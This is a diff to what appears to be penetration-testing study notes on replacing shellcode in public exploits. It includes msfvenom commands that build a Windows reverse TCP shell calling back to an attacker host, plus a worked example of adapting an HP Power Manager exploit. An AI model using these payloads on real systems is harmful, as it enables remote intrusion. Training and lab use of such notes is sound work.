@@ -174,7 +174,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f py -b
 
 - Delete the contents of the existing SHELL/shellcode variable
 - Paste the msfvenom output
-- If it is a Python 2 exploit (print without parentheses): remove the `b` prefix from every line
+- If it is a Python 2.5 or older exploit (print without parentheses), remove the `b` prefix; Python 2.6/2.7 accept it
 
 ```python
 # msfvenom gives you (Python 3 format):
@@ -259,7 +259,7 @@ When the OS version differs:
 - Service found: HP Power Manager, port 80
 - Exploit found: `searchsploit hppower` → `windows/remote/10099.py`
 - What reading it revealed:
-  - bad chars: `\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a`
+  - bad chars: `\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x1a`
   - existing shellcode: bind shell on port 4444
   - egg hunter: present (tag = `n00bn00b`)
   - variable name: `SHELL`
@@ -267,7 +267,7 @@ When the OS version differs:
 - New shellcode generated:
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a' -v SHELL
+msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f py -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x1a' -v SHELL
 ```
 
 - Shellcode replaced:
